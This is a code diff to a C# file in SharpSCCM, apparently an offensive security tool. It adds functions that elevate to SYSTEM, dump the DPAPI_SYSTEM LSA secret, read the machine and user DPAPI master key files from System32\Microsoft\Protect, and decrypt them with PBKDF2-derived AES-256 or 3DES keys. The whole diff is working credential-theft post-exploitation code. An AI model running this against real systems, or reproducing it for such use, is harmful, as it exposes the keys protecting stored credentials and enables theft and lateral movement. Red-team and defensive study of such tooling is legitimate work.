@@ -1,7 +1,12 @@
-﻿using System;
+﻿using PBKDF2;
+using System;
 using System.Text;
 using System.Collections.Generic;
 using System.Security.Cryptography;
+using System.IO;
+using System.Security.AccessControl;
+using System.Text.RegularExpressions;
+using System.Xml;
 
 namespace SharpSCCM
 {
@@ -114,6 +119,280 @@ namespace SharpSCCM
             return new byte[0]; //temp
 
         }
+
+        public static Dictionary<string, string> TriageSystemMasterKeys(bool show = false)
+        {
+            // retrieve the DPAPI_SYSTEM key and use it to decrypt any SYSTEM DPAPI masterkeys
+
+            var mappings = new Dictionary<string, string>();
+
+            if (Helpers.IsHighIntegrity())
+            {
+                // get the system and user DPAPI backup keys, showing the machine DPAPI keys
+                //  { machine , user }
+
+                var keys = LSADump.GetDPAPIKeys(true);
+                Helpers.GetSystem();
+                var systemFolder =
+                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Microsoft\\Protect\\";
+
+                var systemDirs = Directory.GetDirectories(systemFolder);
+
+                foreach (var directory in systemDirs)
+                {
+                    var machineFiles = Directory.GetFiles(directory);
+                    var userFiles = new string[0];
+
+                    if (Directory.Exists($"{directory}\\User\\"))
+                    {
+                        userFiles = Directory.GetFiles($"{directory}\\User\\");
+                    }
+
+                    foreach (var file in machineFiles)
+                    {
+                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                            continue;
+
+                        var fileName = Path.GetFileName(file);
+                        if (show)
+                        {
+                            Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
+                        }
+
+                        var masteyKeyBytes = File.ReadAllBytes(file);
+                        try
+                        {
+                            // use the "machine" DPAPI key
+                            var plaintextMasterkey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
+                            mappings.Add(plaintextMasterkey.Key, plaintextMasterkey.Value);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                        }
+                    }
+
+                    foreach (var file in userFiles)
+                    {
+                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
+                            continue;
+
+                        var fileName = Path.GetFileName(file);
+                        if (show)
+                        {
+                            Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
+                        }
+
+                        var masteyKeyBytes = File.ReadAllBytes(file);
+                        try
+                        {
+                            // use the "user" DPAPI key
+                            var plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
+                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
+                        }
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM masterkeys!\r\n");
+            }
+
+            return mappings;
+        }
+
+        public static KeyValuePair<string, string> DecryptMasterKeyWithSha(byte[] masterKeyBytes, byte[] shaBytes)
+        {
+            // takes masterkey bytes and SYSTEM_DPAPI masterkey sha bytes, returns a dictionary of guid:sha1 masterkey mappings
+            var guidMasterKey = $"{{{Encoding.Unicode.GetString(masterKeyBytes, 12, 72)}}}";
+
+            var mkBytes = GetMasterKey(masterKeyBytes);
+
+            var offset = 4;
+            var salt = new byte[16];
+            Array.Copy(mkBytes, 4, salt, 0, 16);
+            offset += 16;
+
+            var rounds = BitConverter.ToInt32(mkBytes, offset);
+            offset += 4;
+
+            var algHash = BitConverter.ToInt32(mkBytes, offset);
+            offset += 4;
+
+            var algCrypt = BitConverter.ToInt32(mkBytes, offset);
+            offset += 4;
+
+            var encData = new byte[mkBytes.Length - offset];
+            Array.Copy(mkBytes, offset, encData, 0, encData.Length);
+
+            var derivedPreKey = DerivePreKey(shaBytes, algHash, salt, rounds);
+
+            switch (algCrypt)
+            {
+                // CALG_AES_256 == 26128 , CALG_SHA_512 == 32782
+                case 26128 when (algHash == 32782):
+                    {
+                        var masterKeySha1 = DecryptAes256HmacSha512(shaBytes, derivedPreKey, encData);
+                        var masterKeyStr = BitConverter.ToString(masterKeySha1).Replace("-", "");
+
+                        return new KeyValuePair<string, string>(guidMasterKey, masterKeyStr);
+                    }
+
+                // Support for 32777(CALG_HMAC) / 26115(CALG_3DES)
+                case 26115 when (algHash == 32777 || algHash == 32772):
+                    {
+                        var masterKeySha1 = DecryptTripleDESHmac(derivedPreKey, encData);
+                        var masterKeyStr = BitConverter.ToString(masterKeySha1).Replace("-", "");
+
+                        return new KeyValuePair<string, string>(guidMasterKey, masterKeyStr);
+                    }
+
+                default:
+                    throw new Exception($"Alg crypt '{algCrypt} / 0x{algCrypt:X8}' not currently supported!");
+            }
+
+        }
+
+        public static byte[] GetMasterKey(byte[] masterKeyBytes)
+        {
+            // helper to extract domain masterkey subbytes from a master key blob
+
+            var offset = 96;
+
+            var masterKeyLen = BitConverter.ToInt64(masterKeyBytes, offset);
+            offset += 4 * 8; // skip the key length headers
+
+            var masterKeySubBytes = new byte[masterKeyLen];
+            Array.Copy(masterKeyBytes, offset, masterKeySubBytes, 0, masterKeyLen);
+
+            return masterKeySubBytes;
+        }
+
+        private static byte[] DerivePreKey(byte[] shaBytes, int algHash, byte[] salt, int rounds)
+        {
+            byte[] derivedPreKey;
+
+            switch (algHash)
+            {
+                // CALG_SHA_512 == 32782
+                case 32782:
+                    {
+                        // derive the "Pbkdf2/SHA512" key for the masterkey, using MS' silliness
+                        using (var hmac = new HMACSHA512())
+                        {
+                            var df = new Pbkdf2(hmac, shaBytes, salt, rounds);
+                            derivedPreKey = df.GetBytes(48);
+                        }
+
+                        break;
+                    }
+
+                case 32777:
+                    {
+                        // derive the "Pbkdf2/SHA1" key for the masterkey, using MS' silliness
+                        using (var hmac = new HMACSHA1())
+                        {
+                            var df = new Pbkdf2(hmac, shaBytes, salt, rounds);
+                            derivedPreKey = df.GetBytes(32);
+                        }
+
+                        break;
+                    }
+
+                default:
+                    throw new Exception($"alg hash  '{algHash} / 0x{algHash:X8}' not currently supported!");
+            }
+
+            return derivedPreKey;
+        }
+
+        private static byte[] DecryptAes256HmacSha512(byte[] shaBytes, byte[] final, byte[] encData)
+        {
+            var HMACLen = (new HMACSHA512()).HashSize / 8;
+            var aesCryptoProvider = new AesManaged();
+
+            var ivBytes = new byte[16];
+            Array.Copy(final, 32, ivBytes, 0, 16);
+
+            var key = new byte[32];
+            Array.Copy(final, 0, key, 0, 32);
+
+            aesCryptoProvider.Key = key;
+            aesCryptoProvider.IV = ivBytes;
+            aesCryptoProvider.Mode = CipherMode.CBC;
+            aesCryptoProvider.Padding = PaddingMode.Zeros;
+
+            // decrypt the encrypted data using the Pbkdf2-derived key
+            var plaintextBytes = aesCryptoProvider.CreateDecryptor().TransformFinalBlock(encData, 0, encData.Length);
+
+            var outLen = plaintextBytes.Length;
+            var outputLen = outLen - 16 - HMACLen;
+
+            var masterKeyFull = new byte[HMACLen];
+
+            // outLen - outputLen == 80 in this case
+            Array.Copy(plaintextBytes, outLen - outputLen, masterKeyFull, 0, masterKeyFull.Length);
+
+            using (var sha1 = new SHA1Managed())
+            {
+                var masterKeySha1 = sha1.ComputeHash(masterKeyFull);
+
+                // we're HMAC'ing the first 16 bytes of the decrypted buffer with the shaBytes as the key
+                var plaintextCryptBuffer = new byte[16];
+                Array.Copy(plaintextBytes, plaintextCryptBuffer, 16);
+                var hmac1 = new HMACSHA512(shaBytes);
+                var round1Hmac = hmac1.ComputeHash(plaintextCryptBuffer);
+
+                // round 2
+                var round2buffer = new byte[outputLen];
+                Array.Copy(plaintextBytes, outLen - outputLen, round2buffer, 0, outputLen);
+                var hmac2 = new HMACSHA512(round1Hmac);
+                var round2Hmac = hmac2.ComputeHash(round2buffer);
+
+                // compare the second HMAC value to the original plaintextBytes, starting at index 16
+                var comparison = new byte[64];
+                Array.Copy(plaintextBytes, 16, comparison, 0, comparison.Length);
+
+                if (comparison.SequenceEqual(round2Hmac))
+                {
+                    return masterKeySha1;
+                }
+
+                throw new Exception("HMAC integrity check failed!");
+
+            }
+        }
+
+        private static byte[] DecryptTripleDESHmac(byte[] final, byte[] encData)
+        {
+            var desCryptoProvider = new TripleDESCryptoServiceProvider();
+
+            var ivBytes = new byte[8];
+            var key = new byte[24];
+
+            Array.Copy(final, 24, ivBytes, 0, 8);
+            Array.Copy(final, 0, key, 0, 24);
+
+            desCryptoProvider.Key = key;
+            desCryptoProvider.IV = ivBytes;
+            desCryptoProvider.Mode = CipherMode.CBC;
+            desCryptoProvider.Padding = PaddingMode.Zeros;
+
+            var plaintextBytes = desCryptoProvider.CreateDecryptor().TransformFinalBlock(encData, 0, encData.Length);
+            var decryptedkey = new byte[64];
+
+            Array.Copy(plaintextBytes, 40, decryptedkey, 0, 64);
+            using (var sha1 = new SHA1Managed())
+            {
+                var masterKeySha1 = sha1.ComputeHash(decryptedkey);
+                return masterKeySha1;
+            }
+        }
+
 
         public static void Execute(string blob, string masterkey)
         {
